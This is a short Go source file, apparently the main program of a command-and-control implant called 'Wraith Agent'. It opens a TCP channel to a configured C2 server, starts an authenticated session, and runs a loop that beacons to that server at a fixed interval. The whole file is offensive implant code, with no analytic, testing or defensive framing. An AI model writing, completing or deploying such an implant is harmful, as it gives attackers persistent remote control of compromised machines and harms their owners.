package main

import (
	"log"
	"time"
	"github.com/Kronoscba/wraith/agent"
	"github.com/Kronoscba/wraith/agent/comms"
)

func main() {
	// Configuration
	cfg := agent.DefaultConfig()

	// 1. Setup Communication Channel
	channel := comms.NewTCPChannel(cfg.C2Addr)

	// 2. Initialize Session
	session := agent.NewSession(cfg.AgentID, channel, time.Duration(cfg.IntervalSec)*time.Second, []byte(cfg.SharedKey))

	log.Printf("Wraith Agent started. Beaconing to %s every %d seconds\n", cfg.C2Addr, cfg.IntervalSec)
	
	// 3. Start Beaconing Loop
	session.Run()
}
